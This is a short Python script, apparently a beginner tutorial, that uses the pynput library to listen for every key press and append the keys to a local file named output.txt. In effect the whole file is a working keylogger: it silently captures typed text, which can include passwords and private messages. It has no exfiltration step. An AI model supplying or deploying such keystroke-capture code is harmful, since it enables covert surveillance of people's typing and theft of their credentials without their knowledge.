#The pynput library provides way to monitor and control devices
#The Listener class is used to listen for keyboard event
from pynput.keyboard import Listener


def file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == "Key.space":
        letter = ""
    with open("output.txt", 'a') as f:
        f.write(letter)

#The on_press parameter specifies the function that should be called when a key is pressed
with Listener(on_press=file) as l:
    l.join()
